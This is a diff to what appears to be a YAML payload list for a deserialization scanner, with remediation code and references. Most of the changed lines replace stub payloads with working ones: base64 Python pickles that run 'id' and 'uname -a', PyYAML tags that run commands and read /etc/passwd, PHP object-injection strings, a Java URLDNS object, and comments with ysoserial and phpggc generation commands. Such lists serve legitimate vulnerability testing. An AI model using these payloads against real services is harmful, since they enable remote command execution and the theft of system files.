@@ -50,9 +50,9 @@ payloads:
   # Pickle opcode for sleep 10
   - "cos\nsystem\n(S'sleep 10'\ntR."
   # Base64 encoded pickle (id)
-  - "gASVHwAAAAAAAACMCXBvc2l4DQCMA3N5c3RlbQGAMwKMAmlkAIm4u"
+  - "gANjcG9zaXgKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg=="
   # Base64 encoded pickle (uname -a)
-  - "gASVIQAAAAAAAACMCXBvc2l4DQCMA3N5c3RlbQGAMwKMA3VuYW1lIC1hAIm4u"
+  - "gANjcG9zaXgKc3lzdGVtCnEAWAgAAAB1bmFtZSAtYXEBhXECUnEDLg=="
 
   # --- Python PyYAML Unsafe Load ---
   # RCE using os.system
@@ -60,15 +60,15 @@ payloads:
   # RCE using subprocess.check_output
   - "!!python/object/apply:subprocess.check_output [['ls', '-l']]"
   # File read
-  - "!!python/object/new:type [!!python/object/apply:__import__ ['builtins'], !!python/object/apply:__import__ ['os'], !!python/object/apply:open ['/etc/passwd']]"
+  - "!!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]"
 
   # --- PHP Object Injection ---
   # Generic object injection
   - 'O:8:"Exploit":1:{s:7:"command";s:2:"id";}'
   # Null byte injection
   - 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:0:"";}'
-  # PHP serialization gadget (monolog/rce) - simplified example
-  - 'O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"socket";O:29:"Monolog\Handler\BufferHandler":1:{...}}'
+  # PHP Monolog gadget (stub - replace with real gadget chain payload from phpggc)
+  # phpggc Monolog/RCE1 system id | base64
   # Array wrapper bypass
   - 'a:2:{i:0;O:8:"Exploit":0:{}i:1;s:4:"test";}'
 
@@ -78,8 +78,9 @@ payloads:
   - "rO0ABQ=="
   # CommonsCollections1 (URLDNS - harmless ping)
   - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTAYfeZsZ7C5DAwAHSQAIcG9ydGwAB3Byb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHEAfgADTAAEZmlsZXEAfgADeHAAAAAAdAAHZGF0YQ=="
-  # CommonsCollections5 (Sleep 10) - *Disclaimer: Example signature only*
-  - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."
+  # CommonsCollections5 (Sleep 10 - generate with ysoserial)
+  # java -jar ysoserial.jar CommonsCollections5 'sleep 10' | base64
+  # - "<base64 output goes here>"
 
   # --- Node.js Serialization (node-serialize) ---
   # IIFE RCE
@@ -143,7 +144,7 @@ remediation: |
       return SafeUnpickler(io.BytesIO(data)).load()
 
 references:
-  - "https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization"
+  - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
   - "https://cwe.mitre.org/data/definitions/502.html"
   - "https://github.com/frohoff/ysoserial"
   - "https://portswigger.net/web-security/deserialization"
